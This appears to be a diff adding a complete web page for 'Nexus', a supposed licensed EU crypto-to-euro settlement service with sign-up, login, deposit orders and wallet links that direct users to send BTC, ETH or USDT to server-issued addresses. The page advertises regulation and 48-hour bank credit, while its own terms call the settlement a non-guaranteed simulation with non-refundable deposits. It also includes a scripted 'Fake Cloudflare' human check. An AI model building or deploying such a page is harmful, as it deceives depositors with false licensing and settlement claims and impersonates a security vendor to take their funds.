@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Nexus | Institutional Crypto Settlement</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #f8fafc;
+            color: #0f172a;
+            line-height: 1.5;
+        }
+        .container { max-width: 1280px; margin: 0 auto; padding: 0 1.5rem; }
+        /* Header */
+        header {
+            background: white;
+            border-bottom: 1px solid #e2e8f0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(8px);
+            background: rgba(255,255,255,0.95);
+        }
+        .header-inner {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 0;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #0f172a, #3b82f6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+            align-items: center;
+        }
+        .nav-links a {
+            text-decoration: none;
+            color: #1e293b;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .btn {
+            padding: 0.6rem 1.5rem;
+            border-radius: 2rem;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: 0.2s;
+            display: inline-block;
+            text-decoration: none;
+        }
+        .btn-outline {
+            background: transparent;
+            border: 1px solid #3b82f6;
+            color: #3b82f6;
+        }
+        .btn-outline:hover { background: #eff6ff; }
+        .btn-primary {
+            background: #3b82f6;
+            color: white;
+        }
+        .btn-primary:hover { background: #2563eb; transform: translateY(-1px); }
+        /* Hero */
+        .hero {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 3rem;
+            padding: 4rem 0;
+        }
+        .hero-text { flex: 1; }
+        .hero-text h1 { font-size: 3rem; font-weight: 800; line-height: 1.2; margin-bottom: 1rem; }
+        .hero-text p { font-size: 1.125rem; color: #334155; margin-bottom: 2rem; }
+        .hero-image { flex: 1; text-align: center; }
+        .hero-image img { max-width: 100%; border-radius: 2rem; box-shadow: 0 20px 35px -10px rgba(0,0,0,0.1); }
+        .converter-card {
+            background: white;
+            border-radius: 2rem;
+            padding: 2rem;
+            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.1);
+            border: 1px solid #e2e8f0;
+            margin-top: 2rem;
+        }
+        .converter-row {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+        .converter-icon {
+            background: #f1f5f9;
+            border-radius: 2rem;
+            padding: 0.5rem 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-weight: 600;
+        }
+        input {
+            flex: 1;
+            padding: 0.8rem 1rem;
+            border: 1px solid #cbd5e1;
+            border-radius: 2rem;
+            font-size: 1rem;
+        }
+        .price-note { font-size: 0.75rem; color: #475569; margin-top: 0.5rem; text-align: center; }
+        .benefits { padding: 4rem 0; background: white; border-top: 1px solid #e2e8f0; border-bottom: 1px solid #e2e8f0; }
+        .section-title { text-align: center; font-size: 2rem; font-weight: 700; margin-bottom: 2.5rem; }
+        .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 2rem; }
+        .benefit-card { text-align: center; padding: 1.5rem; background: #f8fafc; border-radius: 1.5rem; }
+        .benefit-card i { font-size: 2rem; color: #3b82f6; margin-bottom: 1rem; }
+        .steps { padding: 4rem 0; }
+        .steps-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 2rem; text-align: center; }
+        .step-item { background: white; border-radius: 1.5rem; padding: 1.5rem; border: 1px solid #e2e8f0; }
+        .step-number { background: #3b82f6; color: white; width: 2.5rem; height: 2.5rem; display: inline-flex; align-items: center; justify-content: center; border-radius: 2rem; margin-bottom: 1rem; }
+        .faq { background: white; padding: 4rem 0; border-top: 1px solid #e2e8f0; }
+        .faq-item { border-bottom: 1px solid #e2e8f0; padding: 1rem 0; }
+        .faq-question { font-weight: 700; cursor: pointer; display: flex; justify-content: space-between; }
+        .faq-answer { color: #475569; padding: 0.5rem 0 1rem; display: none; }
+        .faq-answer.show { display: block; }
+        footer { background: #0f172a; color: #94a3b8; padding: 3rem 0 2rem; margin-top: 2rem; }
+        .footer-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 2rem; margin-bottom: 2rem; }
+        .footer-col h4 { color: white; margin-bottom: 1rem; }
+        .footer-col a { display: block; color: #94a3b8; text-decoration: none; margin-bottom: 0.5rem; cursor: pointer; }
+        .footer-bottom { text-align: center; border-top: 1px solid #1e293b; padding-top: 2rem; font-size: 0.8rem; }
+        /* Dark Auth */
+        .auth-container {
+            max-width: 500px;
+            margin: 3rem auto;
+            background: #0f172a;
+            border-radius: 2rem;
+            padding: 2rem;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+            border: 1px solid #334155;
+            color: #e2e8f0;
+        }
+        .auth-container h2 { color: white; text-align: center; margin-bottom: 1.5rem; }
+        .auth-container input { background: #1e293b; border: 1px solid #334155; color: white; margin-bottom: 1rem; }
+        .auth-container input::placeholder { color: #94a3b8; }
+        .auth-container .btn-primary { width: 100%; background: #3b82f6; }
+        /* Fake Cloudflare */
+        .cf-container {
+            background: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 1rem;
+            padding: 0.75rem;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+        .cf-spinner { width: 20px; height: 20px; border: 2px solid #3b82f6; border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        /* Modals */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: #0f172a;
+            border: 1px solid #3b82f6;
+            border-radius: 2rem;
+            padding: 2rem;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            color: white;
+        }
+        .wallet-buttons { display: flex; flex-wrap: wrap; gap: 1rem; justify-content: center; margin: 1rem 0; }
+        .wallet-btn { background: #1e293b; border: 1px solid #3b82f6; border-radius: 2rem; padding: 0.5rem 1rem; cursor: pointer; display: inline-flex; align-items: center; gap: 0.5rem; }
+        /* Dashboard */
+        .dashboard-container { max-width: 1200px; margin: 2rem auto; }
+        .dashboard-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2rem; }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1.5rem; margin-bottom: 2rem; }
+        .stat-card { background: white; border-radius: 1.5rem; padding: 1.5rem; box-shadow: 0 1px 3px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
+        .stat-title { font-size: 0.8rem; text-transform: uppercase; color: #64748b; }
+        .stat-value { font-size: 1.8rem; font-weight: 800; margin-top: 0.5rem; }
+        .order-card { background: white; border-radius: 1.5rem; padding: 1.5rem; margin-bottom: 1.5rem; border: 1px solid #e2e8f0; }
+        .status { display: inline-block; padding: 0.25rem 0.75rem; border-radius: 1rem; font-size: 0.75rem; font-weight: 600; }
+        .status-pending { background: #fef3c7; color: #92400e; }
+        .status-received { background: #dcfce7; color: #166534; }
+        .status-credited { background: #dbeafe; color: #1e40af; }
+        .mono { font-family: monospace; font-size: 0.8rem; word-break: break-all; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 0.75rem; border-bottom: 1px solid #e2e8f0; text-align: left; }
+        .hidden { display: none; }
+        @media (max-width: 768px) { .hero { flex-direction: column; text-align: center; } .hero-text h1 { font-size: 2rem; } }
+    </style>
+</head>
+<body>
+    <header id="mainHeader">
+        <div class="container header-inner">
+            <div class="logo">Nexus</div>
+            <div class="nav-links" id="navLinks">
+                <a class="nav-home">Home</a>
+                <a class="nav-getstarted">Get Started</a>
+                <a class="btn btn-outline" id="loginNavBtn">Login</a>
+                <a class="btn btn-primary" id="registerNavBtn">Register</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Landing Page -->
+    <div id="landingSections">
+        <div class="container hero">
+            <div class="hero-text">
+                <h1>Convert Bitcoin BTC to Euro EUR</h1>
+                <p>Instant settlement, bank credit in 48 hours. Trusted by institutions across Europe.</p>
+                <button class="btn btn-primary" id="heroGetStartedBtn">Get Started</button>
+            </div>
+            <div class="hero-image">
+                <img src="https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=600&h=400&fit=crop" alt="Bitcoin">
+            </div>
+        </div>
+        <div class="container converter-card">
+            <div class="converter-row">
+                <div class="converter-icon"><i class="fab fa-bitcoin"></i> BTC</div>
+                <input type="number" id="btcAmount" value="1" step="any">
+            </div>
+            <div class="converter-row">
+                <div class="converter-icon"><i class="fas fa-euro-sign"></i> EUR</div>
+                <input type="text" id="eurAmount" readonly>
+            </div>
+            <div class="price-note">1 BTC = <span id="btcEurPrice">loading...</span> EUR</div>
+        </div>
+        <div class="benefits">
+            <div class="container">
+                <h2 class="section-title">Why Nexus</h2>
+                <div class="grid-4">
+                    <div class="benefit-card"><i class="fas fa-charging-station"></i><h3>Instant Rates</h3><p>Real-time without markups</p></div>
+                    <div class="benefit-card"><i class="fas fa-euro-sign"></i><h3>Fast EUR Settlement</h3><p>1-2 business days</p></div>
+                    <div class="benefit-card"><i class="fas fa-coins"></i><h3>Low Fees</h3><p>Competitive rates</p></div>
+                    <div class="benefit-card"><i class="fas fa-shield-alt"></i><h3>Licensed</h3><p>EU regulated</p></div>
+                </div>
+                <div style="text-align:center; margin-top:2rem;"><button class="btn btn-primary getstarted-footer">Get Started</button></div>
+            </div>
+        </div>
+        <div class="container steps">
+            <h2 class="section-title">How It Works</h2>
+            <div class="steps-grid">
+                <div class="step-item"><div class="step-number">1</div><strong>Create order</strong><br>Choose asset & amount</div>
+                <div class="step-item"><div class="step-number">2</div><strong>Send crypto</strong><br>To your vault address</div>
+                <div class="step-item"><div class="step-number">3</div><strong>Verify</strong><br>Click check transaction</div>
+                <div class="step-item"><div class="step-number">4</div><strong>Bank credit</strong><br>48h + SWIFT ref</div>
+            </div>
+        </div>
+        <div class="faq">
+            <div class="container">
+                <h2 class="section-title">FAQ</h2>
+                <div class="faq-item"><div class="faq-question">How are rates set? <i class="fas fa-chevron-down"></i></div><div class="faq-answer">Live market data from top exchanges.</div></div>
+                <div class="faq-item"><div class="faq-question">How fast is EUR settlement? <i class="fas fa-chevron-down"></i></div><div class="faq-answer">1-2 business days, instant SEPA coming soon.</div></div>
+                <div class="faq-item"><div class="faq-question">Is Nexus legal? <i class="fas fa-chevron-down"></i></div><div class="faq-answer">Yes, licensed DASP in multiple EU countries.</div></div>
+            </div>
+        </div>
+        <footer>
+            <div class="container footer-grid">
+                <div class="footer-col"><h4>Product</h4><a>Business</a><a>OTC</a><a>Swap</a></div>
+                <div class="footer-col"><h4>Buy Crypto</h4><a>Bitcoin</a><a>Ethereum</a><a>USDT</a></div>
+                <div class="footer-col"><h4>Learn</h4><a>FAQs</a><a>Support</a><a>Blog</a></div>
+                <div class="footer-col"><h4>Company</h4><a>About</a><a>Careers</a><a>Privacy</a></div>
+            </div>
+            <div class="container footer-bottom"><p>© 2026 Nexus. Crypto investments carry risk.</p></div>
+        </footer>
+    </div>
+
+    <!-- Dark Auth Container -->
+    <div id="authContainer" class="container hidden">
+        <div class="auth-container">
+            <div id="loginForm">
+                <h2>Log In</h2>
+                <input type="email" id="loginEmail" placeholder="Email address">
+                <input type="text" id="loginPhrase" placeholder="7-word secret phrase">
+                <button id="doLogin" class="btn btn-primary">Sign In</button>
+                <p style="margin-top:1rem; text-align:center;">No account? <a id="switchToRegBtn">Sign Up</a></p>
+                <div id="loginMsg" class="hidden" style="color:#f87171; margin-top:0.5rem;"></div>
+            </div>
+            <div id="regForm" class="hidden">
+                <h2>Sign Up</h2>
+                <input type="email" id="regEmail" placeholder="Email address">
+                <input type="text" id="inviteCode" placeholder="Invitation code (optional)">
+                <!-- Fake Cloudflare that resets each time reg form is shown -->
+                <div id="cfWrapper"></div>
+                <div style="font-size:0.75rem; margin-bottom:1rem;">
+                    <input type="checkbox" id="agreeTerms"> I agree to the <a id="termsLink" style="color:#60a5fa; cursor:pointer;">Terms of Service</a>
+                </div>
+                <button id="doRegister" class="btn btn-primary">Sign Up</button>
+                <p style="margin-top:1rem; text-align:center;">Already have an account? <a id="switchToLoginBtn">Log in now</a></p>
+                <div id="regMsg" class="hidden" style="color:#f87171; margin-top:0.5rem;"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Terms Modal -->
+    <div id="termsModal" class="modal hidden">
+        <div class="modal-content" style="text-align:left;">
+            <h3>Terms of Service</h3>
+            <p style="margin-top:1rem;">By using Nexus, you agree to the following:</p>
+            <ul style="margin-left:1.5rem; margin-top:0.5rem;">
+                <li>You are at least 18 years old.</li>
+                <li>You will not use Nexus for any illegal activity.</li>
+                <li>All crypto deposits are final and non-refundable.</li>
+                <li>Bank credit simulation is for educational demonstration only.</li>
+                <li>Nexus does not guarantee real fiat settlement; this is a simulated environment.</li>
+                <li>Your secret phrase is your responsibility – we cannot recover lost phrases.</li>
+            </ul>
+            <button id="closeTermsBtn" class="btn btn-primary" style="margin-top:1.5rem;">I Understand</button>
+        </div>
+    </div>
+
+    <!-- Secret Phrase Modal -->
+    <div id="phraseModal" class="modal hidden">
+        <div class="modal-content">
+            <i class="fas fa-shield-alt" style="font-size:2rem;"></i>
+            <h3>Your Secret Phrase</h3>
+            <p>Save this phrase. You will need it to log in.</p>
+            <div class="mono" style="background:#1e293b; padding:1rem; border-radius:1rem; margin:1rem 0;" id="modalPhraseText"></div>
+            <button id="copyPhraseBtn" class="btn btn-primary">Copy & Save</button>
+            <button id="closeModalBtn" class="btn btn-outline" style="margin-top:0.5rem;">I have saved it</button>
+        </div>
+    </div>
+
+    <!-- Wallet Selection Modal -->
+    <div id="walletModal" class="modal hidden">
+        <div class="modal-content">
+            <i class="fas fa-wallet" style="font-size:2rem;"></i>
+            <h3>Send Crypto</h3>
+            <p>Select your wallet to complete the transfer</p>
+            <div class="wallet-buttons" id="walletButtons"></div>
+            <p class="mono" style="margin-top:1rem; word-break:break-all;" id="orderAddressDisplay"></p>
+            <button id="closeWalletModal" class="btn btn-outline" style="margin-top:1rem;">Cancel</button>
+        </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div id="dashboardContainer" class="container hidden">
+        <div class="dashboard-container">
+            <div class="dashboard-header">
+                <h2>Dashboard</h2>
+                <button id="logoutBtn" class="btn btn-outline">Sign out</button>
+            </div>
+            <div class="stats-grid">
+                <div class="stat-card"><div class="stat-title">Total Portfolio Value</div><div class="stat-value">€0.00</div></div>
+                <div class="stat-card"><div class="stat-title">Active Orders</div><div class="stat-value" id="activeOrdersCount">0</div></div>
+                <div class="stat-card"><div class="stat-title">Settled Credits</div><div class="stat-value" id="creditedCount">0</div></div>
+            </div>
+            <div class="order-card">
+                <h3>Create Deposit Order</h3>
+                <div style="display:flex; gap:1rem; flex-wrap:wrap;">
+                    <select id="assetSelect" style="flex:1; padding:0.75rem; border-radius:1rem;">
+                        <option value="BTC">Bitcoin (BTC)</option>
+                        <option value="ETH">Ethereum (ETH)</option>
+                        <option value="USDT">Tether (USDT)</option>
+                    </select>
+                    <input type="number" id="orderAmount" step="0.001" placeholder="Amount" style="flex:1;">
+                    <button id="createOrderBtn" class="btn btn-primary">Create Order</button>
+                </div>
+                <div id="orderInfo" class="hidden" style="background:#e6f7e6; padding:0.75rem; border-radius:1rem; margin-top:1rem;"></div>
+            </div>
+            <div class="order-card">
+                <h3>Recent Orders</h3>
+                <div style="overflow-x:auto;">
+                    <table>
+                        <thead><tr><th>Order ID</th><th>Asset</th><th>Amount</th><th>Status</th><th>Detected At</th><th>Bank Credit</th><th>Action</th></tr></thead>
+                        <tbody id="ordersBody"><tr><td colspan="7">Loading...</td></tr></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Helper: reset Cloudflare inside register form every time it's shown
+        function resetCloudflare() {
+            const wrapper = document.getElementById('cfWrapper');
+            if (!wrapper) return;
+            wrapper.innerHTML = `
+                <div class="cf-container" id="cfContainer">
+                    <div class="cf-spinner"></div>
+                    <span id="cfText">Verifying your connection...</span>
+                </div>
+                <div id="cfCheckboxDiv" class="hidden" style="margin-bottom:1rem;">
+                    <input type="checkbox" id="cfCheckbox"> <span>I am human</span>
+                    <i class="fas fa-cloud" style="margin-left: auto; color:#3b82f6;"></i>
+                </div>
+            `;
+            // After 1.5 seconds, replace with checkbox
+            setTimeout(() => {
+                const container = document.getElementById('cfContainer');
+                const checkboxDiv = document.getElementById('cfCheckboxDiv');
+                if (container && checkboxDiv) {
+                    container.style.display = 'none';
+                    checkboxDiv.classList.remove('hidden');
+                }
+            }, 1500);
+        }
+
+        // Navigation logic: hide header nav links when dashboard visible
+        const mainHeader = document.getElementById('mainHeader');
+        const navLinks = document.getElementById('navLinks');
+        function updateHeaderForView() {
+            const isDashboard = !dashboardContainer.classList.contains('hidden');
+            if (isDashboard) {
+                navLinks.classList.add('hidden');
+            } else {
+                navLinks.classList.remove('hidden');
+            }
+        }
+
+        const landing = document.getElementById('landingSections');
+        const authContainer = document.getElementById('authContainer');
+        const dashboardContainer = document.getElementById('dashboardContainer');
+        const loginFormDiv = document.getElementById('loginForm');
+        const regFormDiv = document.getElementById('regForm');
+        const switchToReg = document.getElementById('switchToRegBtn');
+        const switchToLogin = document.getElementById('switchToLoginBtn');
+        const loginNav = document.getElementById('loginNavBtn');
+        const registerNav = document.getElementById('registerNavBtn');
+        const heroBtn = document.getElementById('heroGetStartedBtn');
+        const footerBtn = document.querySelector('.getstarted-footer');
+        const navGetstarted = document.querySelector('.nav-home, .nav-getstarted');
+
+        function showLanding() { 
+            landing.classList.remove('hidden'); 
+            authContainer.classList.add('hidden'); 
+            dashboardContainer.classList.add('hidden'); 
+            updateHeaderForView();
+        }
+        function showAuth(showLogin = true) {
+            landing.classList.add('hidden');
+            authContainer.classList.remove('hidden');
+            dashboardContainer.classList.add('hidden');
+            if (showLogin) { 
+                loginFormDiv.classList.remove('hidden'); 
+                regFormDiv.classList.add('hidden'); 
+            } else { 
+                loginFormDiv.classList.add('hidden'); 
+                regFormDiv.classList.remove('hidden');
+                resetCloudflare(); // reset Cloudflare each time register form shown
+            }
+            updateHeaderForView();
+        }
+        function showDashboard() { 
+            landing.classList.add('hidden'); 
+            authContainer.classList.add('hidden'); 
+            dashboardContainer.classList.remove('hidden'); 
+            updateHeaderForView();
+        }
+
+        loginNav.onclick = () => showAuth(true);
+        registerNav.onclick = () => showAuth(false);
+        if (heroBtn) heroBtn.onclick = () => showAuth(true);
+        if (footerBtn) footerBtn.onclick = () => showAuth(true);
+        document.querySelectorAll('.nav-home, .nav-getstarted').forEach(el => {
+            if (el) el.onclick = () => showLanding();
+        });
+        if (switchToReg) switchToReg.onclick = () => { loginFormDiv.classList.add('hidden'); regFormDiv.classList.remove('hidden'); resetCloudflare(); };
+        if (switchToLogin) switchToLogin.onclick = () => { loginFormDiv.classList.remove('hidden'); regFormDiv.classList.add('hidden'); };
+
+        // Terms modal
+        const termsLink = document.getElementById('termsLink');
+        const termsModal = document.getElementById('termsModal');
+        if (termsLink) termsLink.onclick = () => termsModal.classList.remove('hidden');
+        document.getElementById('closeTermsBtn').onclick = () => termsModal.classList.add('hidden');
+
+        // API
+        const API = '';
+        async function fetchJSON(url, options = {}) {
+            const res = await fetch(url, { ...options, headers: { 'Content-Type':'application/json' } });
+            if (!res.ok) throw new Error((await res.json()).error || 'Request failed');
+            return res.json();
+        }
+
+        // Registration
+        let pendingPhrase = null;
+        document.getElementById('doRegister').onclick = async () => {
+            const email = document.getElementById('regEmail').value;
+            const cfCheckbox = document.getElementById('cfCheckbox');
+            const cfChecked = cfCheckbox ? cfCheckbox.checked : false;
+            const termsChecked = document.getElementById('agreeTerms').checked;
+            if (!email || !email.includes('@')) return alert('Valid email required');
+            if (!cfChecked) return alert('Please complete Cloudflare verification');
+            if (!termsChecked) return alert('You must agree to the Terms of Service');
+            try {
+                const data = await fetchJSON(`${API}/api/register`, { method:'POST', body: JSON.stringify({ email }) });
+                pendingPhrase = data.phrase;
+                document.getElementById('modalPhraseText').innerText = pendingPhrase;
+                document.getElementById('phraseModal').classList.remove('hidden');
+            } catch(e) { document.getElementById('regMsg').innerHTML = e.message; document.getElementById('regMsg').classList.remove('hidden'); }
+        };
+        document.getElementById('copyPhraseBtn').onclick = () => { navigator.clipboard.writeText(pendingPhrase); alert('Phrase copied!'); };
+        document.getElementById('closeModalBtn').onclick = () => {
+            document.getElementById('phraseModal').classList.add('hidden');
+            alert('Registration successful! Please login.');
+            showAuth(true);
+            document.getElementById('loginEmail').value = document.getElementById('regEmail').value;
+        };
+
+        // Login
+        document.getElementById('doLogin').onclick = async () => {
+            const email = document.getElementById('loginEmail').value;
+            const phrase = document.getElementById('loginPhrase').value;
+            try {
+                await fetchJSON(`${API}/api/login`, { method:'POST', body: JSON.stringify({ email, phrase }) });
+                await loadDashboard();
+                showDashboard();
+            } catch(e) { document.getElementById('loginMsg').innerHTML = e.message; document.getElementById('loginMsg').classList.remove('hidden'); }
+        };
+        document.getElementById('logoutBtn').onclick = async () => { await fetchJSON(`${API}/api/logout`, { method:'POST' }); showLanding(); };
+
+        async function loadDashboard() {
+            const data = await fetchJSON(`${API}/api/me`);
+            const orders = data.orders;
+            const active = orders.filter(o => o.status !== 'credited').length;
+            const credited = orders.filter(o => o.status === 'credited').length;
+            document.getElementById('activeOrdersCount').innerText = active;
+            document.getElementById('creditedCount').innerText = credited;
+            renderOrders(orders);
+        }
+        function renderOrders(orders) {
+            const tbody = document.getElementById('ordersBody');
+            if (!orders.length) { tbody.innerHTML = '<tr><td colspan="7">No orders. Create one above.</td></tr>'; return; }
+            let html = '';
+            for (let o of orders) {
+                let statusClass = o.status==='pending_match' ? 'status-pending' : (o.status==='received' ? 'status-received' : 'status-credited');
+                let statusText = o.status==='pending_match' ? 'Pending' : (o.status==='received' ? 'Received' : 'Credited');
+                let eta = '';
+                if (o.status === 'received' && o.scheduled_credit_at) {
+                    const diff = o.scheduled_credit_at - Date.now();
+                    if (diff > 0) eta = `${Math.floor(diff/3600000)}h ${Math.floor((diff%3600000)/60000)}m`;
+                    else eta = 'Processing';
+                } else if (o.status === 'credited') eta = `SWIFT: ${o.swift_ref || 'done'}`;
+                else eta = '—';
+                let checkButton = o.status === 'pending_match' ? `<button class="btn btn-outline check-tx" data-id="${o.id}" style="padding:0.25rem 0.75rem;">Check</button>` : '—';
+                html += `<tr><td class="mono">${o.id}</td><td>${o.asset}</td><td>${o.amount}</td><td><span class="status ${statusClass}">${statusText}</span></td><td>${o.received_at ? new Date(o.received_at).toLocaleString() : '—'}</td><td>${eta}</td><td>${checkButton}</td></tr>`;
+            }
+            tbody.innerHTML = html;
+            document.querySelectorAll('.check-tx').forEach(btn => {
+                btn.onclick = async () => {
+                    const orderId = btn.getAttribute('data-id');
+                    try {
+                        const res = await fetchJSON(`${API}/api/check-transaction`, { method:'POST', body: JSON.stringify({ orderId }) });
+                        alert(res.message || `Status: ${res.status}`);
+                        loadDashboard();
+                    } catch(e) { alert(e.message); }
+                };
+            });
+        }
+
+        // Order creation with wallet redirect
+        let lastOrderAddress = '';
+        document.getElementById('createOrderBtn').onclick = async () => {
+            const asset = document.getElementById('assetSelect').value;
+            const amount = parseFloat(document.getElementById('orderAmount').value);
+            if (isNaN(amount) || amount <= 0) return alert('Enter valid amount');
+            try {
+                const res = await fetchJSON(`${API}/api/create-order`, { method:'POST', body: JSON.stringify({ asset, amount }) });
+                lastOrderAddress = res.address;
+                const walletDiv = document.getElementById('walletButtons');
+                const wallets = [
+                    { name: 'Trust Wallet', url: `trust://send?address=${res.address}&amount=${amount}&asset=${asset.toLowerCase()}` },
+                    { name: 'MetaMask', url: 'metamask', isMetamask: true },
+                    { name: 'Coinbase Wallet', url: `cbwallet://send?address=${res.address}` },
+                    { name: 'Exodus', url: `exodus://send?address=${res.address}` },
+                    { name: 'Rainbow', url: `rainbow://send?address=${res.address}` }
+                ];
+                walletDiv.innerHTML = wallets.map(w => `<div class="wallet-btn" data-url="${w.url}" data-ismm="${w.isMetamask || false}" data-address="${res.address}" data-name="${w.name}"><i class="fas fa-wallet"></i> ${w.name}</div>`).join('');
+                document.getElementById('orderAddressDisplay').innerText = `Address: ${res.address}`;
+                document.getElementById('walletModal').classList.remove('hidden');
+                document.querySelectorAll('#walletButtons .wallet-btn').forEach(btn => {
+                    btn.onclick = () => {
+                        if (btn.getAttribute('data-ismm') === 'true') {
+                            navigator.clipboard.writeText(lastOrderAddress);
+                            alert('Address copied! Open MetaMask and paste it.');
+                        } else {
+                            window.location.href = btn.getAttribute('data-url');
+                        }
+                    };
+                });
+                document.getElementById('orderInfo').innerHTML = `Order created! Select your wallet to send ${amount} ${asset}.`;
+                document.getElementById('orderInfo').classList.remove('hidden');
+                loadDashboard();
+            } catch(e) { alert(e.message); }
+        };
+        document.getElementById('closeWalletModal').onclick = () => document.getElementById('walletModal').classList.add('hidden');
+
+        // BTC/EUR converter
+        let btcPrice = 0;
+        const btcInput = document.getElementById('btcAmount');
+        const eurInput = document.getElementById('eurAmount');
+        const priceSpan = document.getElementById('btcEurPrice');
+        async function fetchPrice() {
+            try {
+                const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=eur');
+                const data = await res.json();
+                btcPrice = data.bitcoin.eur;
+                priceSpan.innerText = btcPrice.toLocaleString(undefined, { minimumFractionDigits: 2 });
+                updateEur();
+            } catch(e) { priceSpan.innerText = 'unavailable'; }
+        }
+        function updateEur() { const btc = parseFloat(btcInput.value) || 0; eurInput.value = (btc * btcPrice).toLocaleString(undefined, { minimumFractionDigits: 2 }); }
+        btcInput.addEventListener('input', updateEur);
+        fetchPrice(); setInterval(fetchPrice, 30000);
+
+        // FAQ toggle
+        document.querySelectorAll('.faq-question').forEach(q => q.addEventListener('click', () => q.nextElementSibling.classList.toggle('show')));
+
+        // Auto login check
+        (async () => { try { const res = await fetch(`${API}/api/me`); if (res.ok) { await loadDashboard(); showDashboard(); } } catch(e) {} })();
+        setInterval(() => { if (!dashboardContainer.classList.contains('hidden')) loadDashboard(); }, 5000);
+        
+        // initial Cloudflare if register is shown first time (not needed but safe)
+        if (regFormDiv && !regFormDiv.classList.contains('hidden')) resetCloudflare();
+    </script>
+</body>
+</html>
